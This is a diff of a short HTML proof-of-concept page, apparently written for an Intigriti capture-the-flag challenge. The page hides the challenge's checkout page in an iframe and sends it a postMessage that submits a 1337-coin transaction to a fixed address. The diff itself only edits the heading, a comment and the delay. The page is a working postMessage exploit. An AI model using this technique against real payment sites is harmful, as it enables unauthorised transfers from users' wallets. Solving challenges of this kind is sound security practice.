@@ -4,7 +4,7 @@
   <title>POC</title>
 </head>
 <body>
-  <h1>Proof of Concept for Payment Vulnerability</h1>
+  <h1>Proof of Concept</h1>
   <iframe id="exploitFrame" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1" style="display:none;"></iframe>
   <script>
     const iframe = document.getElementById('exploitFrame');
@@ -13,12 +13,12 @@
         iframe.contentWindow.postMessage({
           type: 'submitTransaction',
           transaction: {
-            toAddress: '10bcb878fee5243f6198045a60c49cba2b',  // Replace with your address from step 1
+            toAddress: '10bcb878fee5243f6198045a60c49cba2b',
             currency: '1337COIN',
             amount: 1337
           }
         }, '*');
-      }, 3000);  // Delay to ensure wallets load
+      }, 5000);  // Increased delay for full load
     };
   </script>
 </body>
